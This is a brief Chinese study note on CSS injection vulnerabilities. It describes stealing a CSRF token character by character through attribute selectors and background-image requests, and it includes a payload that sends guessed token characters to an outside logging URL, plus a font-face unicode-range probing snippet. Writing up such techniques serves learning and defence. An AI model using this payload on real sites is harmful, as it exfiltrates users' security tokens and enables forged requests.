---
title: CSS安全漏洞
tags: 
- CSS
---

## CSS安全漏洞
- 伪元素

- background-image属性
  
  举例如下，
  
  原理
  
  - 1、向要攻击的站点的url附上一段查询字符串，如`injection=#sensitiveForm input[value^='${csrfToken}a'] {background-image:url(https://security.love/log.php/${csrfToken}a);}`
  
  - 2、当页面存在满足以上CSS选择器时，便会触发`background-image`地址链接，推断出token的第一个字符
  
  - 3、重复步骤1、2，直到服务器再无接收到响应，可认为已获取到token的所有字符

  链接：
  
  - [攻击者地址](https://security.love/cssInjection/attacker.html)
  - [受害者地址](https://security.love/cssInjection/victim.html)

- 自定义字体
  ```css
  @font-face {
    font-family: blah;
    src: url('/page-contains-q') format('woff');
    unicode-range: U+85;
  }
  html {
    font-family: blah, sans-serif;
  }
  ```

> 这些漏洞存在安全隐患，当然也可以往好的方面利用，比如做网页追踪、分析
